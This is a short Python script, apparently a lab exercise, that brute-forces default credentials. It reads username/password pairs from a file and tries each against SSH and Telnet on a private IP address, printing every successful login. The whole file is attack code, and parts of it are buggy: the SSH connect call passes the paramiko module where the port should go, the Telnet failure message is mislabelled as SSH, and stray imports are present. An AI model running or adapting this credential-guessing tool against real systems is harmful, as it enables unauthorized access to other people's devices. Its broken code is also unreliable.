from fileinput import close
from re import S
from socket import timeout
from unittest import result
import paramiko
import telnetlib

def SSHLogin(host,port,username,password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,paramiko,username=username,password=
        password);
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print("SSH Login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        ssh.close()

    except:
        print("SSH login failed %s %s" % (username,password))


def TelnetLogin(host,port,username,password):
    try:
        tn = telnetlib.Telnet(host,port)
        tn.read_until(b"Login: ")
        tn.write((username + "\n").encode("utf-8"))
        tn.read_until(b"Password: ")
        tn.write((password + "\n").encode("utf-8"))
        result = tn.expect([b"Last Login"],timeout=2)
        if (result[0] >= 0):
            print("Telnet Login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        tn.close()
    except Exception as e:
        print("SSH login failed %s %s" % (username,password))

host = "192.168.179.10"
with open("defaults.txt", "r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host,"22",username,password)
        TelnetLogin(host,"23",username,password)
